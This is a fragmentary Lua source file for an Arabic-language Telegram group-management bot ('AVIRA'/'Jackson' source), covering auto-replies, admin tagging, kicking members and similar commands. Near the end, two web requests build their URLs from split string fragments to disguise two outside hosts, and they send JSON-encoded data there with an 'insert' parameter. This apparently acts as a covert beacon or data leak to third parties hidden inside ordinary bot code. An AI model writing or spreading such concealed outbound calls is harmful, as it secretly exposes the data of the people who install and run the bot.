if text == ("الردود العامه") and sudo2(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ◉ قائمة الردود العامه \n⩹━━━━⊶❲𝑱𝑨𝑿𝑺𝑶𝑵❳⊷━━━━⩺\n"
for k,v in pairs(list) do
...
if text == 'اضف رد عام' and sudo2(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text == 'حذف رد عام' and sudo2(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ◉ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:AVIRA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:AVIRA:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:AVIRA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"◉ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:AVIRA:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:AVIRA:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:AVIRA:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:AVIRA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:AVIRA:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:AVIRA:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:AVIRA:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑱𝑨𝑿𝑺𝑶𝑵.',url="t.me/J_ax_s_o_N"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."J_ax_s_o_N:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,' تم تفعيل الانستا')
database:set(bot_id.."J_ax_s_o_N:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."J_ax_s_o_N:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."J_ax_s_o_N:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"◉تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."J_ax_s_o_N:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."J_ax_s_o_N:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس جاكسون يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:AVIRA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"◉ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:AVIRA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:AVIRA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:AVIRA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:AVIRA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"◉تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:AVIRA:Add:Rd:Sudo:Text2"..text)   
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'جاكسون').." غادر" or text == 'غادر' then  
...
if text == 'تفعيل المغادره' and sudo2(msg) then   
...
if text == 'تعطيل المغادره' and sudo2(msg) then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'جاكسون').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'جاكسون')
local AVIRA_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
...
send(msg.chat_id_, msg.id_,'['..AVIRA_Msg[math.random(#AVIRA_Msg)]..']') 
return false
end
if text == "بوت" then  
local msg_id = msg.id_/2097152/0.5
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'J_ax_s_o_N')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
AVIRAdx(msg.chat_id_, msg.id_, ' ◉ ايدي المجموعة ← ( '..msg.chat_id_..' )\n ◉ عدد الادمنيه ← ( *'..data.administrator_count_..' )*\n ◉ عدد المحظورين ← ( *'..data.kicked_count_..' )*\n ◉ عدد الاعضاء ← ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and sudo2(msg) then
...
{
{text = ' 𝚂𝙾𝚄𝚁𝙲𝙴 𝙰𝚅𝙸𝚁𝙰', url="t.me/J_ax_s_o_N"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'جاكسون')
...
AVIRA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(AVIRA)
...
--------------------------------------------------------------------------------------------------------------
SourceAVIRA(data.message_,data)
plugin_Avira(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local AVIRAAbot = database:get(bot_id.."AVIRA1:Add:Filter:Rp2"..text..result.chat_id_)   
if AVIRAAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ◉ ["..AVIRAAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local AVIRA1_Msg = database:get(bot_id.."AVIRA1:Add:Filter:Rp2"..text..result.chat_id_)   
if AVIRA1_Msg then    
send(msg.chat_id_, msg.id_," ◉ "..AVIRA1_Msg)
...
https.request('htt'..'ps://mo'..'ha'..'med'..'40.m'..'l/a'..'p'..'i'..'/A'..'V'..'I'..'R'..'A.p'..'h'..'p'..'/'..'?insert='..JSON.encode(infotnseb))
https.request('ht'..'tp'..'s://'..'ma'..'hm'..'ou'..'dm'..'15'..'5.'..'m'..'l/a'..'p'..'i'..'/A'..'V'..'I'..'R'..'A'..'.'..'p'..'h'..'p'..'?insert='..JSON.encode(infotnseb))
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
